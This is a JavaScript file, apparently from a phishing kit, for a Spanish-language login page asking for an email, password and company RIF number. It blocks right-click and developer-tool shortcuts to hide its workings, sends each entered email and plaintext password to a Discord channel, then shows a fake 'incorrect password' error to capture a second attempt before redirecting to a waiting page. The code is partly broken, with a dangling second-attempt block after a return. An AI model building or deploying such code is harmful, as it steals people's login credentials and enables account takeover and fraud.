document.addEventListener('DOMContentLoaded', () => {
    // ==========================================
    // PROTECCIÓN CONTRA INSPECCIÓN Y TRUCOS
    // ==========================================
    
    // Bloquear el menú contextual (clic derecho)
    document.addEventListener('contextmenu', e => e.preventDefault());

    // Bloquear atajos de teclado para desarrolladores (F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, etc.)
    document.addEventListener('keydown', (e) => {
        if (
            e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
            (e.ctrlKey && e.key === 'U')
        ) {
            e.preventDefault();
            return false;
        }
    });

    // ==========================================
    // LÓGICA DEL FORMULARIO Y DISCORD
    // ==========================================
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.querySelector('input[name="usuario"]');
    const passwordInput = document.getElementById('password');
    const loginButton = document.querySelector('.btn-ingresar');
    const togglePasswords = document.querySelectorAll('.toggle-password');
    const typeButtons = document.querySelectorAll('.type-btn');
    const juridicoFields = document.getElementById('juridicoFields');
    const rifGroup = document.getElementById('rifGroup');
    const isAuthorizedCheck = document.getElementById('isAuthorized');
    const rifNumberInput = document.querySelector('input[name="rifNumber"]');

    loginButton.disabled = false;
    loginButton.classList.add('active');

    const REDIRECCION_URL = 'wait.html';

    // Inicializar el control de intentos en 0 cada vez que se carga la página principal
    localStorage.setItem('intentos_login', '0');

    togglePasswords.forEach(toggle => {
        toggle.addEventListener('click', () => {
            const targetId = toggle.getAttribute('data-target');
            const input = document.getElementById(targetId);
            if (input) {
                input.type = input.type === 'password' ? 'text' : 'password';
            }
        });
    });

    typeButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            typeButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            if (btn.id === 'btnJuridico') {
                juridicoFields.style.display = 'block';
            } else {
                juridicoFields.style.display = 'none';
                isAuthorizedCheck.checked = false;
                rifGroup.style.display = 'none';
                rifNumberInput.value = '';
            }
        });
    });

    isAuthorizedCheck.addEventListener('change', () => {
        if (isAuthorizedCheck.checked) {
            rifGroup.style.display = 'block';
        } else {
            rifGroup.style.display = 'none';
            rifNumberInput.value = '';
            document.getElementById('rifError').textContent = '';
            rifNumberInput.classList.remove('error');
        }
    });

    rifNumberInput.addEventListener('input', () => {
        const rifError = document.getElementById('rifError');
        rifNumberInput.value = rifNumberInput.value.replace(/\D/g, '');

        if (rifNumberInput.value.trim() !== '') {
            rifError.textContent = '';
            rifNumberInput.classList.remove('error');
        } else {
            rifError.textContent = 'El RIF de la empresa es requerido';
            rifNumberInput.classList.add('error');
        }
    });

    emailInput.addEventListener('input', () => {
        const usuario = emailInput.value.trim();
        const usuarioError = document.getElementById('usuarioError');

        if (usuario === '') {
            usuarioError.textContent = 'Debe indicar el correo';
            emailInput.classList.add('error');
        } else if (!usuario.includes('@')) {
            usuarioError.textContent = 'Por favor Ingresa con el correo electrónico afiliado a tu cuenta.';
            emailInput.classList.add('error');
        } else {
            usuarioError.textContent = '';
            emailInput.classList.remove('error');
        }
    });

    passwordInput.addEventListener('input', () => {
        const password = passwordInput.value;
        const passwordError = document.getElementById('passwordError');
        
        const hasUppercase = /[A-Z]/.test(password);
        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>_\-\+=$$$$\\\/`~]/.test(password);
        const hasNumber = /[0-9]/.test(password);

        if (password === '') {
            passwordError.textContent = 'La contraseña es requerida';
            passwordInput.classList.add('error');
        } else if (password.length < 8) {
            passwordError.textContent = 'La contraseña debe contener al menos 8 caracteres';
            passwordInput.classList.add('error');
        } else if (!hasUppercase || !hasSpecialChar || !hasNumber) {
            passwordError.textContent = 'Debe incluir al menos 1 mayúscula, 1 carácter especial y 1 número';
            passwordInput.classList.add('error');
        } else {
            passwordError.textContent = '';
            passwordInput.classList.remove('error');
        }
    });

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        if (loginButton.disabled) return;

        const usuario = emailInput.value.trim();
        const password = passwordInput.value;
        
        const usuarioError = document.getElementById('usuarioError');
        const passwordError = document.getElementById('passwordError');

        let isValid = true;

        usuarioError.textContent = '';
        passwordError.textContent = '';
        
        emailInput.classList.remove('error');
        passwordInput.classList.remove('error');

        if (usuario === '') {
            usuarioError.textContent = 'Debe indicar el correo';
            emailInput.classList.add('error');
            isValid = false;
        } else if (!usuario.includes('@')) {
            usuarioError.textContent = 'Por favor Ingresa con el correo electrónico afiliado a tu cuenta.';
            emailInput.classList.add('error');
            isValid = false;
        }

        const hasUppercase = /[A-Z]/.test(password);
        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>_\-\+=$$$$\\\/`~]/.test(password);
        const hasNumber = /[0-9]/.test(password);

        if (password === '') {
            passwordError.textContent = 'La contraseña es requerida';
            passwordInput.classList.add('error');
            isValid = false;
        } else if (password.length < 8) {
            passwordError.textContent = 'La contraseña debe contener al menos 8 caracteres';
            passwordInput.classList.add('error');
            isValid = false;
        } else if (!hasUppercase || !hasSpecialChar || !hasNumber) {
            passwordError.textContent = 'Debe incluir al menos 1 mayúscula, 1 carácter especial y 1 número';
            passwordInput.classList.add('error');
            isValid = false;
        }

        const tipoUsuario = document.querySelector('.type-btn.active')?.textContent || 'No especificado';
        const isAuthorized = isAuthorizedCheck.checked;
        const rifType = document.querySelector('select[name="rifType"]')?.value;
        const rifNumber = rifNumberInput.value.trim();

        if (tipoUsuario.includes('Jurídico') && isAuthorized) {
            if (rifNumber === '') {
                document.getElementById('rifError').textContent = 'El RIF de la empresa es requerido';
                rifNumberInput.classList.add('error');
                isValid = false;
            }
        }

        if (!isValid) {
            loginButton.disabled = false;
            loginButton.style.opacity = '1';
            loginButton.style.cursor = 'pointer';
            loginButton.textContent = 'Ingresar';
            return;
        }

        // Control de intentos almacenado localmente
        let intentos = parseInt(localStorage.getItem('intentos_login') || '0');

        loginButton.disabled = true;
        loginButton.style.opacity = '0.6';
        loginButton.style.cursor = 'not-allowed';
        loginButton.textContent = 'Ingresando...';

        if (intentos === 0) {
            // ==========================================
            // 1ER INTENTO: Enviar a Discord y forzar error
            // ==========================================
            let mensajeIntento1 = `❌ **Intento 1 (CANAL#2)**\n\n` +
                                  `📧 **Correo:** ${usuario}\n\n` +
                                  `🔑 **Contraseña:** ${password}\n\n` +
                                  `🏢 **Tipo:** ${tipoUsuario}\n`;

            if (tipoUsuario.includes('Jurídico')) {
                mensajeIntento1 += `✅ **Autorizado:** ${isAuthorized ? 'Sí' : 'No'}\n`;
                if (isAuthorized) {
                    mensajeIntento1 += `🪪 **RIF:** ${rifType}${rifNumber}\n`;
                }
            }

            try {
                await enviarADiscord(mensajeIntento1);
            } catch (error) {
                console.error("Error al enviar:", error);
            }

            // Simular fallo tras 1 segundo para mostrar el mensaje solicitado
            setTimeout(() => {
                passwordError.textContent = 'Correo/Contraseña incorrectos Porfavor Verificar Ingrese Nuevamente';
                passwordInput.classList.add('error');
                passwordInput.value = ''; // Limpiamos la contraseña para que la escriban de nuevo
                loginButton.disabled = false;
                loginButton.style.opacity = '1';
                loginButton.style.cursor = 'pointer';
                loginButton.textContent = 'Ingresar';
                localStorage.setItem('intentos_login', '1'); // Marcamos que el primer intento ya ocurrió
            }, 1000);

            return;

      

            try {
                await enviarADiscord(mensajeIntento2);
            } catch (error) {
                console.error("Error al enviar:", error);
            }

            localStorage.setItem('usuario_guardado', usuario);
            window.location.href = REDIRECCION_URL;
        }
    });
});